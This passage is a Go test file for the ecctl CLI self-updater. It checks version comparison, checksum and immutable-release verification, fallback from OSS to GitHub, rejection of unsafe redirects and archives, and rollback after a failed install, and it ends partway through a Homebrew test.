package updater

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/aliyun/elastic-compute-control-cli/internal/releaseartifact"
)

func TestCompareVersions(t *testing.T) {
	ordered := []string{"0.1.0-alpha", "0.1.0-rc.1", "0.1.0", "0.1.1", "1.0.0"}
	for index := 0; index+1 < len(ordered); index++ {
		got, err := CompareVersions(ordered[index], ordered[index+1])
		if err != nil || got >= 0 {
			t.Fatalf("CompareVersions(%q, %q) = %d, %v", ordered[index], ordered[index+1], got, err)
		}
	}
	for _, invalid := range []string{"", "1.0", "1.02.3", "1.0.0+build"} {
		if _, err := NormalizeVersion(invalid); err == nil {
			t.Fatalf("NormalizeVersion(%q) succeeded", invalid)
		}
	}
}

func TestClientDownloadsOSSArtifact(t *testing.T) {
	archive := testTarGzip(t, "ecctl", []byte("binary"))
	server := releaseServer(t, archive, false, false)
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}

	version, err := client.LatestVersion(context.Background())
	if err != nil || version != "1.2.3" {
		t.Fatalf("LatestVersion = %q, %v", version, err)
	}
	artifact, err := client.DownloadArtifact(context.Background(), version, "darwin", "arm64")
	if err != nil {
		t.Fatal(err)
	}
	if artifact.Source != "oss" || !bytes.Equal(artifact.Archive, archive) {
		t.Fatalf("artifact = %#v", artifact)
	}
}

func TestLatestVersionRequiresOneSemVerValue(t *testing.T) {
	for _, body := range []string{"1.2.3\r\n", "1.2.3\nextra\n", "1.2.3-rc.1\n"} {
		t.Run(fmt.Sprintf("%q", body), func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				fmt.Fprint(w, body)
			}))
			defer server.Close()
			client := &Client{HTTP: server.Client(), OSSBase: server.URL}
			if _, err := client.LatestVersion(context.Background()); err == nil {
				t.Fatalf("LatestVersion accepted %q", body)
			}
		})
	}
	for _, body := range []string{"1.2.3", "1.2.3\n"} {
		t.Run("valid_"+fmt.Sprintf("%q", body), func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				fmt.Fprint(w, body)
			}))
			defer server.Close()
			client := &Client{HTTP: server.Client(), OSSBase: server.URL}
			if version, err := client.LatestVersion(context.Background()); err != nil || version != "1.2.3" {
				t.Fatalf("LatestVersion(%q) = %q, %v", body, version, err)
			}
		})
	}
}

func TestResolveLatestVersionRequiresMatchingImmutableStableRelease(t *testing.T) {
	tests := []struct {
		name       string
		oss        string
		tag        string
		draft      bool
		prerelease bool
		immutable  bool
		want       string
		kind       ErrorKind
	}{
		{name: "match", oss: "1.2.3", tag: "v1.2.3", immutable: true, want: "1.2.3"},
		{name: "oss propagation lag", oss: "1.2.2", tag: "v1.2.3", immutable: true, kind: ErrorUnavailable},
		{name: "oss ahead", oss: "1.2.4", tag: "v1.2.3", immutable: true, kind: ErrorIntegrity},
		{name: "mutable release", oss: "1.2.3", tag: "v1.2.3", kind: ErrorIntegrity},
		{name: "draft release", oss: "1.2.3", tag: "v1.2.3", draft: true, immutable: true, kind: ErrorIntegrity},
		{name: "prerelease metadata", oss: "1.2.3", tag: "v1.2.3", prerelease: true, immutable: true, kind: ErrorIntegrity},
		{name: "prerelease tag", oss: "1.2.3", tag: "v1.2.3-rc.1", immutable: true, kind: ErrorIntegrity},
		{name: "missing v prefix", oss: "1.2.3", tag: "1.2.3", immutable: true, kind: ErrorIntegrity},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
				switch request.URL.Path {
				case "/oss/version.txt":
					fmt.Fprintln(w, test.oss)
				case "/api/latest":
					version := strings.TrimPrefix(test.tag, "v")
					if _, err := NormalizeVersion(version); err != nil {
						version = "1.2.3"
					}
					writeTestReleaseTag(t, w, request, version, test.tag, test.draft, test.prerelease, test.immutable, nil)
				default:
					http.NotFound(w, request)
				}
			}))
			defer server.Close()
			client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}
			got, err := client.ResolveLatestVersion(context.Background())
			if test.kind == "" {
				if err != nil || got != test.want {
					t.Fatalf("ResolveLatestVersion = %q, %v", got, err)
				}
				return
			}
			if err == nil || ErrorKindOf(err) != test.kind {
				t.Fatalf("ResolveLatestVersion = %q, %v (kind %q), want %q", got, err, ErrorKindOf(err), test.kind)
			}
		})
	}
}

func TestExplicitTargetRejectsUntrustedReleaseBeforeArtifact(t *testing.T) {
	tests := []struct {
		name       string
		tag        string
		draft      bool
		prerelease bool
		immutable  bool
	}{
		{name: "mutable", tag: "v1.2.3"},
		{name: "draft", tag: "v1.2.3", draft: true, immutable: true},
		{name: "wrong tag", tag: "v1.2.4", immutable: true},
		{name: "prerelease mismatch", tag: "v1.2.3", prerelease: true, immutable: true},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var artifactRequests atomic.Int32
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
				if request.URL.Path == "/api/tags/v1.2.3" {
					writeTestReleaseTag(t, w, request, strings.TrimPrefix(test.tag, "v"), test.tag, test.draft, test.prerelease, test.immutable, nil)
					return
				}
				artifactRequests.Add(1)
				http.NotFound(w, request)
			}))
			defer server.Close()
			_, err := Check(context.Background(), Options{
				CurrentVersion: "1.2.2", TargetVersion: "1.2.3", GOOS: "darwin", GOARCH: "arm64",
				Client:   &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"},
				LookPath: func(string) (string, error) { return "", os.ErrNotExist },
			})
			if err == nil || ErrorKindOf(err) != ErrorIntegrity {
				t.Fatalf("untrusted release error = %v, kind=%q", err, ErrorKindOf(err))
			}
			if artifactRequests.Load() != 0 {
				t.Fatalf("artifact requests = %d, want 0", artifactRequests.Load())
			}
		})
	}
}

func TestClientFallsBackToGitHubWhenOSSUnavailable(t *testing.T) {
	archive := testTarGzip(t, "ecctl", []byte("binary"))
	server := releaseServer(t, archive, true, false)
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}

	artifact, err := client.DownloadArtifact(context.Background(), "1.2.3", "darwin", "arm64")
	if err != nil {
		t.Fatal(err)
	}
	if artifact.Source != "github" {
		t.Fatalf("source = %q, want github", artifact.Source)
	}
}

func TestClientFallsBackToGitHubOnPartialOSSResponse(t *testing.T) {
	archive := testTarGzip(t, "ecctl", []byte("binary"))
	digest := sha256.Sum256(archive)
	checksum := hex.EncodeToString(digest[:])
	filename := "ecctl_1.2.3_darwin_arm64.tar.gz"
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/api/tags/v1.2.3":
			writeTestRelease(t, w, r, "1.2.3", false, false, true, map[string][]byte{"checksums.txt": []byte(checksum + "  " + filename + "\n"), filename: archive})
		case r.URL.Path == "/oss/1.2.3/checksums.txt":
			w.Header().Set("Content-Length", "500")
			fmt.Fprint(w, "partial")
		case r.URL.Path == "/assets/"+filename:
			_, _ = w.Write(archive)
		default:
			http.NotFound(w, r)
		}
	}))
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}

	artifact, err := client.DownloadArtifact(context.Background(), "1.2.3", "darwin", "arm64")
	if err != nil {
		t.Fatal(err)
	}
	if artifact.Source != "github" {
		t.Fatalf("source = %q, want github", artifact.Source)
	}
}

func TestClientDoesNotFallbackOnOSSIntegrityFailure(t *testing.T) {
	archive := testTarGzip(t, "ecctl", []byte("binary"))
	server := releaseServer(t, archive, false, true)
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}

	_, err := client.DownloadArtifact(context.Background(), "1.2.3", "darwin", "arm64")
	if err == nil || !strings.Contains(err.Error(), "checksum mismatch") {
		t.Fatalf("DownloadArtifact error = %v", err)
	}
	if kind := ErrorKindOf(err); kind != ErrorIntegrity {
		t.Fatalf("error kind = %q, want integrity", kind)
	}
}

func TestClientRejectsSelfConsistentMaliciousOSSAgainstGitHubDigest(t *testing.T) {
	cleanArchive := testTarGzip(t, "ecctl", []byte("clean-binary"))
	maliciousArchive := testTarGzip(t, "ecctl", []byte("malicious-binary"))
	cleanDigest := sha256.Sum256(cleanArchive)
	maliciousDigest := sha256.Sum256(maliciousArchive)
	filename := "ecctl_1.2.3_darwin_arm64.tar.gz"
	var githubArchiveRequests atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
		cleanChecksums := fmt.Sprintf("%s  %s\n", hex.EncodeToString(cleanDigest[:]), filename)
		switch request.URL.Path {
		case "/api/tags/v1.2.3":
			writeTestRelease(t, w, request, "1.2.3", false, false, true, map[string][]byte{"checksums.txt": []byte(cleanChecksums), filename: cleanArchive})
		case "/oss/1.2.3/checksums.txt":
			fmt.Fprintf(w, "%s  %s\n", hex.EncodeToString(maliciousDigest[:]), filename)
		case "/oss/1.2.3/" + filename:
			_, _ = w.Write(maliciousArchive)
		case "/assets/" + filename:
			githubArchiveRequests.Add(1)
			_, _ = w.Write(cleanArchive)
		default:
			http.NotFound(w, request)
		}
	}))
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}

	_, err := client.DownloadArtifact(context.Background(), "1.2.3", "darwin", "arm64")
	if err == nil || ErrorKindOf(err) != ErrorIntegrity || !strings.Contains(err.Error(), "immutable GitHub Release digest") {
		t.Fatalf("malicious OSS error = %v, kind=%q", err, ErrorKindOf(err))
	}
	if requests := githubArchiveRequests.Load(); requests != 0 {
		t.Fatalf("integrity failure fell back to GitHub archive %d time(s)", requests)
	}
}

func TestClientClassifiesUnavailableSourcesAsRetryable(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		http.Error(w, "unavailable", http.StatusServiceUnavailable)
	}))
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}
	_, err := client.DownloadArtifact(context.Background(), "1.2.3", "darwin", "arm64")
	if err == nil || ErrorKindOf(err) != ErrorUnavailable || !ErrorRetryable(ErrorKindOf(err)) {
		t.Fatalf("unavailable error = %v, kind=%q", err, ErrorKindOf(err))
	}
}

func TestTLSFailureIsNotClassifiedAsFallback(t *testing.T) {
	err := classifyAvailability(context.Background(), "oss", fmt.Errorf("fetch archive: %w", &url.Error{Op: "Get", URL: "https://oss.example", Err: fmt.Errorf("tls: bad certificate")}))
	var unavailable *sourceUnavailableError
	if errors.As(err, &unavailable) {
		t.Fatalf("TLS failure was classified as unavailable fallback: %v", err)
	}
}

func TestClientTimeoutFallsBackWhileCallerContextIsLive(t *testing.T) {
	archive := testTarGzip(t, "ecctl", []byte("binary"))
	digest := sha256.Sum256(archive)
	filename := "ecctl_1.2.3_darwin_arm64.tar.gz"
	var githubRequests atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
		if strings.HasPrefix(request.URL.Path, "/oss/") {
			time.Sleep(100 * time.Millisecond)
			return
		}
		githubRequests.Add(1)
		switch request.URL.Path {
		case "/api/tags/v1.2.3":
			checksums := fmt.Sprintf("%s  %s\n", hex.EncodeToString(digest[:]), filename)
			writeTestRelease(t, w, request, "1.2.3", false, false, true, map[string][]byte{"checksums.txt": []byte(checksums), filename: archive})
		case "/assets/" + filename:
			_, _ = w.Write(archive)
		default:
			http.NotFound(w, request)
		}
	}))
	defer server.Close()
	client := &Client{HTTP: &http.Client{Timeout: 20 * time.Millisecond}, OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}
	artifact, err := client.DownloadArtifact(context.Background(), "1.2.3", "darwin", "arm64")
	if err != nil || artifact.Source != "github" {
		t.Fatalf("DownloadArtifact = %#v, %v", artifact, err)
	}
	if githubRequests.Load() == 0 {
		t.Fatal("GitHub fallback was not attempted")
	}
}

func TestCallerContextStopsFallback(t *testing.T) {
	var githubRequests atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
		if strings.HasPrefix(request.URL.Path, "/github/") {
			githubRequests.Add(1)
		}
		<-request.Context().Done()
	}))
	defer server.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()
	client := &Client{HTTP: &http.Client{Timeout: time.Second}, OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}
	_, err := client.DownloadArtifact(ctx, "1.2.3", "darwin", "arm64")
	if !errors.Is(err, context.DeadlineExceeded) || ErrorKindOf(err) != ErrorTimeout {
		t.Fatalf("context error = %v, kind=%q", err, ErrorKindOf(err))
	}
	if got := githubRequests.Load(); got != 0 {
		t.Fatalf("GitHub requests = %d, want 0", got)
	}
}

func TestNewClientRejectsExcessiveAndInsecureRedirects(t *testing.T) {
	t.Run("ten hop limit", func(t *testing.T) {
		server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
			hop := 0
			_, _ = fmt.Sscanf(request.URL.Query().Get("hop"), "%d", &hop)
			http.Redirect(w, request, fmt.Sprintf("/version.txt?hop=%d", hop+1), http.StatusFound)
		}))
		defer server.Close()
		client := NewClient(time.Second)
		client.HTTP.Transport = server.Client().Transport
		client.OSSBase = server.URL
		_, err := client.LatestVersion(context.Background())
		if err == nil || !strings.Contains(err.Error(), "stopped after 10 redirects") {
			t.Fatalf("redirect error = %v", err)
		}
	})

	t.Run("HTTPS downgrade", func(t *testing.T) {
		server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
			http.Redirect(w, request, "http://example.invalid/version.txt", http.StatusFound)
		}))
		defer server.Close()
		client := NewClient(time.Second)
		client.HTTP.Transport = server.Client().Transport
		client.OSSBase = server.URL
		_, err := client.LatestVersion(context.Background())
		if err == nil || ErrorKindOf(err) != ErrorIntegrity || !strings.Contains(err.Error(), "must remain on HTTPS") {
			t.Fatalf("downgrade error = %v, kind=%q", err, ErrorKindOf(err))
		}
	})

	t.Run("untrusted HTTPS host", func(t *testing.T) {
		server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
			http.Redirect(w, request, "https://example.invalid/version.txt", http.StatusFound)
		}))
		defer server.Close()
		client := NewClient(time.Second)
		client.HTTP.Transport = server.Client().Transport
		client.OSSBase = server.URL
		_, err := client.LatestVersion(context.Background())
		if err == nil || ErrorKindOf(err) != ErrorIntegrity || !errors.Is(err, errUntrustedRedirect) {
			t.Fatalf("untrusted redirect error = %v, kind=%q", err, ErrorKindOf(err))
		}
	})
}

func TestMidBodyTLSFailureIsNotClassifiedAsFallback(t *testing.T) {
	client := &Client{HTTP: &http.Client{Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
		return &http.Response{
			StatusCode: http.StatusOK,
			Body:       &errorReadCloser{err: fmt.Errorf("tls: bad record MAC")},
			Header:     make(http.Header),
		}, nil
	})}}
	_, err := client.fetch(context.Background(), "https://oss.example/archive", 1024, "oss archive")
	var unavailable *sourceUnavailableError
	if err == nil || errors.As(err, &unavailable) {
		t.Fatalf("mid-body TLS error = %v, unavailable=%v", err, unavailable)
	}
}

func TestExtractExecutableRejectsUnsafeArchive(t *testing.T) {
	unsafe := testTarGzip(t, "../ecctl", []byte("binary"))
	_, err := extractExecutable(Artifact{Filename: "ecctl_1.2.3_linux_amd64.tar.gz", Archive: unsafe}, "linux")
	if err == nil || !strings.Contains(err.Error(), "unsafe path") {
		t.Fatalf("extractExecutable error = %v", err)
	}
	nested := testTarGzip(t, "nested/ecctl", []byte("binary"))
	if _, err := extractExecutable(Artifact{Filename: "ecctl_1.2.3_linux_amd64.tar.gz", Archive: nested}, "linux"); err == nil || !strings.Contains(err.Error(), "does not contain") {
		t.Fatalf("nested executable error = %v", err)
	}

	zipRaw := testZip(t, "ecctl.exe", []byte("binary"))
	got, err := extractExecutable(Artifact{Filename: "ecctl_1.2.3_windows_amd64.zip", Archive: zipRaw}, "windows")
	if err != nil || string(got) != "binary" {
		t.Fatalf("zip extraction = %q, %v", got, err)
	}
}

func TestExtractExecutableRejectsArchiveResourceExhaustion(t *testing.T) {
	tests := []struct {
		name     string
		artifact Artifact
		goos     string
		want     string
	}{
		{
			name: "tar entry count", goos: "linux", want: "more than 128 entries",
			artifact: Artifact{Filename: "ecctl_1.2.3_linux_amd64.tar.gz", Archive: testTarGzipEntries(t, 129)},
		},
		{
			name: "zip entry count", goos: "windows", want: "more than 128 entries",
			artifact: Artifact{Filename: "ecctl_1.2.3_windows_amd64.zip", Archive: testZipEntries(t, 129)},
		},
		{
			name: "tar declared bytes", goos: "linux", want: "uncompressed bytes",
			artifact: Artifact{Filename: "ecctl_1.2.3_linux_amd64.tar.gz", Archive: forgeTarDeclaredSize(t, maxArchiveUncompressedBytes+1)},
		},
		{
			name: "zip declared bytes", goos: "windows", want: "uncompressed bytes",
			artifact: Artifact{Filename: "ecctl_1.2.3_windows_amd64.zip", Archive: forgeZipDeclaredSize(t, maxArchiveUncompressedBytes+1)},
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			_, err := extractExecutable(test.artifact, test.goos)
			if err == nil || !strings.Contains(err.Error(), test.want) {
				t.Fatalf("extractExecutable error = %v, want %q", err, test.want)
			}
		})
	}
}

func TestReplaceExecutableRollsBackFailedPostInstallValidation(t *testing.T) {
	root := t.TempDir()
	executable := filepath.Join(root, "ecctl")
	if err := os.WriteFile(executable, []byte("old-binary"), 0o755); err != nil {
		t.Fatal(err)
	}
	newValidations := 0
	runner := func(_ context.Context, _ []string, name string, _ ...string) ([]byte, error) {
		raw, err := os.ReadFile(name)
		if err != nil {
			return nil, err
		}
		if string(raw) == "old-binary" {
			return []byte("ecctl 1.2.2\n"), nil
		}
		newValidations++
		if newValidations == 1 {
			return []byte("ecctl 1.2.3\n"), nil
		}
		return []byte("ecctl 9.9.9\n"), nil
	}
	_, err := replaceExecutable(context.Background(), Options{Executable: executable, CurrentVersion: "1.2.2", RunCommand: runner}, []byte("new-binary"), "1.2.3")
	if err == nil {
		t.Fatal("replaceExecutable succeeded, want validation error")
	}
	raw, readErr := os.ReadFile(executable)
	if readErr != nil || string(raw) != "old-binary" {
		t.Fatalf("rollback executable = %q, %v", raw, readErr)
	}
	if _, statErr := os.Lstat(filepath.Join(root, ".ecctl-update.lock")); statErr != nil {
		t.Fatalf("persistent update lock is missing: %v", statErr)
	}
	if leftovers, globErr := filepath.Glob(filepath.Join(root, ".ecctl-update-*")); globErr != nil || len(leftovers) != 0 {
		t.Fatalf("update transaction leftovers = %v, %v", leftovers, globErr)
	}
}

func TestReplaceExecutableRollsBackWithIndependentContextAfterCancellation(t *testing.T) {
	root := t.TempDir()
	executable := filepath.Join(root, "ecctl")
	if err := os.WriteFile(executable, []byte("old-binary"), 0o755); err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	newValidations := 0
	runner := func(commandCtx context.Context, _ []string, name string, _ ...string) ([]byte, error) {
		raw, err := os.ReadFile(name)
		if err != nil {
			return nil, err
		}
		if string(raw) == "old-binary" {
			if err := commandCtx.Err(); err != nil {
				return nil, err
			}
			return []byte("ecctl 1.2.2\n"), nil
		}
		newValidations++
		if newValidations == 1 {
			return []byte("ecctl 1.2.3\n"), nil
		}
		cancel()
		return nil, commandCtx.Err()
	}
	_, err := replaceExecutable(ctx, Options{
		CurrentVersion: "1.2.2", Executable: executable, RunCommand: runner,
	}, []byte("new-binary"), "1.2.3")
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("replaceExecutable error = %v, want context cancellation", err)
	}
	raw, readErr := os.ReadFile(executable)
	if readErr != nil || string(raw) != "old-binary" {
		t.Fatalf("rollback executable = %q, %v", raw, readErr)
	}
	if leftovers, globErr := filepath.Glob(filepath.Join(root, ".ecctl-update-*")); globErr != nil || len(leftovers) != 0 {
		t.Fatalf("update transaction leftovers = %v, %v", leftovers, globErr)
	}
}

func TestUpdateDirectReplacesExecutable(t *testing.T) {
	archive := testTarGzip(t, "ecctl", []byte("new-binary"))
	server := releaseServer(t, archive, false, false)
	defer server.Close()
	root := t.TempDir()
	executable := filepath.Join(root, "ecctl")
	if err := os.WriteFile(executable, []byte("old-binary"), 0o755); err != nil {
		t.Fatal(err)
	}
	runner := func(_ context.Context, _ []string, name string, _ ...string) ([]byte, error) {
		raw, err := os.ReadFile(name)
		if err != nil {
			return nil, err
		}
		if string(raw) == "new-binary" {
			return []byte("ecctl 1.2.3\n"), nil
		}
		return []byte("ecctl 1.2.2\n"), nil
	}
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}
	result, err := Update(context.Background(), Options{
		CurrentVersion: "1.2.2", Executable: executable, GOOS: "darwin", GOARCH: "arm64", Client: client, RunCommand: runner,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !result.Updated || result.Source != "oss" {
		t.Fatalf("result = %#v", result)
	}
	raw, err := os.ReadFile(executable)
	if err != nil || string(raw) != "new-binary" {
		t.Fatalf("installed executable = %q, %v", raw, err)
	}
	if _, err := os.Stat(executable + ".update-backup"); !os.IsNotExist(err) {
		t.Fatalf("backup remains: %v", err)
	}
}

func TestCheckExplicitVersionValidatesPublishedArtifact(t *testing.T) {
	var pointerRequests atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
		switch request.URL.Path {
		case "/oss/version.txt", "/api/latest":
			pointerRequests.Add(1)
			http.Error(w, "must not be read", http.StatusInternalServerError)
		default:
			http.NotFound(w, request)
		}
	}))
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}
	_, err := Check(context.Background(), Options{
		CurrentVersion: "1.2.2", TargetVersion: "1.2.4", GOOS: "darwin", GOARCH: "arm64", Client: client,
		LookPath: func(string) (string, error) { return "", os.ErrNotExist },
	})
	if err == nil || ErrorKindOf(err) != ErrorUnavailable {
		t.Fatalf("unpublished explicit target error = %v, kind=%q", err, ErrorKindOf(err))
	}
	if pointerRequests.Load() != 0 {
		t.Fatal("explicit direct target consulted the mutable stable pointer")
	}
}

func TestCheckExplicitDirectTargetsUseExactImmutableReleaseOnly(t *testing.T) {
	for _, target := range []string{"1.2.2", "1.2.4-rc.1"} {
		t.Run(target, func(t *testing.T) {
			filename := "ecctl_" + target + "_darwin_arm64.tar.gz"
			archive := []byte("archive-" + target)
			checksum := digestBytes(archive) + "  " + filename + "\n"
			var pointerRequests atomic.Int32
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
				switch request.URL.Path {
				case "/oss/version.txt", "/api/latest":
					pointerRequests.Add(1)
					http.Error(w, "must not be read", http.StatusInternalServerError)
				case "/api/tags/v" + target:
					writeTestRelease(t, w, request, target, false, strings.Contains(target, "-"), true, map[string][]byte{"checksums.txt": []byte(checksum), filename: archive})
				case "/oss/" + target + "/checksums.txt":
					fmt.Fprint(w, checksum)
				case "/oss/" + target + "/" + filename:
					_, _ = w.Write(archive)
				default:
					http.NotFound(w, request)
				}
			}))
			defer server.Close()
			result, err := Check(context.Background(), Options{
				CurrentVersion: "1.2.1", TargetVersion: target, GOOS: "darwin", GOARCH: "arm64",
				Client: &Client{
					HTTP: server.Client(), OSSBase: server.URL + "/oss",
					GitHubAPIBase: server.URL + "/api/latest",
				},
				LookPath: func(string) (string, error) { return "", os.ErrNotExist },
			})
			if err != nil || result.TargetVersion != target || result.Source != "oss" || !result.UpdateAvailable {
				t.Fatalf("explicit target result = %#v, %v", result, err)
			}
			if pointerRequests.Load() != 0 {
				t.Fatal("explicit direct target consulted latest stable metadata")
			}
		})
	}
}

func TestCheckReportsGitHubWhenOSSArtifactIsUnavailable(t *testing.T) {
	archive := testTarGzip(t, "ecctl", []byte("binary"))
	server := releaseServer(t, archive, true, false)
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}
	result, err := Check(context.Background(), Options{
		CurrentVersion: "1.2.2", TargetVersion: "1.2.3", GOOS: "darwin", GOARCH: "arm64", Client: client,
		LookPath: func(string) (string, error) { return "", os.ErrNotExist },
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Source != "github" || !result.UpdateAvailable {
		t.Fatalf("check result = %#v", result)
	}
}

func TestCheckReportsGitHubWhenOSSArchiveIsMissing(t *testing.T) {
	archive := testTarGzip(t, "ecctl", []byte("binary"))
	digest := sha256.Sum256(archive)
	filename := "ecctl_1.2.3_darwin_arm64.tar.gz"
	checksums := fmt.Sprintf("%s  %s\n", hex.EncodeToString(digest[:]), filename)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
		switch request.URL.Path {
		case "/api/tags/v1.2.3":
			writeTestRelease(t, w, request, "1.2.3", false, false, true, map[string][]byte{"checksums.txt": []byte(checksums), filename: archive})
		case "/oss/1.2.3/checksums.txt":
			fmt.Fprint(w, checksums)
		case "/oss/1.2.3/" + filename:
			http.NotFound(w, request)
		case "/assets/" + filename:
			_, _ = w.Write(archive)
		default:
			http.NotFound(w, request)
		}
	}))
	defer server.Close()
	client := &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"}
	result, err := Check(context.Background(), Options{
		CurrentVersion: "1.2.2", TargetVersion: "1.2.3", GOOS: "darwin", GOARCH: "arm64", Client: client,
		LookPath: func(string) (string, error) { return "", os.ErrNotExist },
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Source != "github" {
		t.Fatalf("check source = %q, want github", result.Source)
	}
}

func TestCheckRejectsNonLatestExplicitVersionForHomebrew(t *testing.T) {
	root := t.TempDir()
	prefix := filepath.Join(root, "homebrew")
	caskBinary := filepath.Join(prefix, "Caskroom", "ecctl", "1.2.2", "ecctl")
	if err := os.MkdirAll(filepath.Dir(caskBinary), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(caskBinary, []byte("binary"), 0o755); err != nil {
		t.Fatal(err)
	}
	brew := filepath.Join(prefix, "bin", "brew")
	if err := os.MkdirAll(filepath.Dir(brew), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(brew, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(root, "ecctl")
	if err := os.Symlink(caskBinary, link); err != nil {
		t.Fatal(err)
	}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
		if request.URL.Path == "/oss/version.txt" {
			fmt.Fprint(w, "1.2.3")
			return
		}
		if request.URL.Path == "/api/latest" {
			writeTestRelease(t, w, request, "1.2.3", false, false, true, nil)
			return
		}
		http.NotFound(w, request)
	}))
	defer server.Close()
	runner := func(_ context.Context, _ []string, _ string, args ...string) ([]byte, error) {
		if len(args) == 1 && args[0] == "--prefix" {
			return []byte(prefix + "\n"), nil
		}
		if len(args) == 1 && args[0] == "--caskroom" {
			return []byte(filepath.Join(prefix, "Caskroom") + "\n"), nil
		}
		return nil, fmt.Errorf("unexpected command %v", args)
	}
	_, err := Check(context.Background(), Options{
		CurrentVersion: "1.2.2", TargetVersion: "1.2.4-rc.1", Executable: link, GOOS: "darwin", GOARCH: "arm64",
		Client:     &Client{HTTP: server.Client(), OSSBase: server.URL + "/oss", GitHubAPIBase: server.URL + "/api/latest"},
		RunCommand: runner, LookPath: func(string) (string, error) { return "/usr/local/bin/brew", nil },
	})
	if err == nil || ErrorKindOf(err) != ErrorInvalidTarget {
		t.Fatalf("Homebrew explicit target error = %v, kind=%q", err, ErrorKindOf(err))
	}
}

func TestUpdateWithHomebrewUsesVerifiedAbsoluteCask(t *testing.T) {
	root := t.TempDir()
	prefix := filepath.Join(root, "homebrew")
	caskBinary := filepath.Join(prefix, "Caskroom", "ecctl", "1.2.2", "ecctl")
	if err := os.MkdirAll(filepath.Dir(caskBinary), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(caskBinary, []byte("binary"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(prefix, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	brew := filepath.Join(prefix, "bin", "brew")
	if err := os.WriteFile(brew, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(prefix, "bin", "ecctl")
	if err := os.Symlink(caskBinary, link); err != nil {
		t.Fatal(err)
	}
	canonicalPrefix, err := canonicalExistingPath(prefix)
	if err != nil {
		t.Fatal(err)
	}
	canonicalBrew := filepath.Join(canonicalPrefix, "bin", "brew")
	canonicalLink := filepath.Join(canonicalPrefix, "bin", "ecctl")
	intelSHA := strings.Repeat("a", 64)
	armSHA := strings.Repeat("b", 64)
	caskRaw := testCask("1.2.3", intelSHA, armSHA)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
		if request.URL.Path == "/assets/ecctl_1.2.3_cask.rb" {
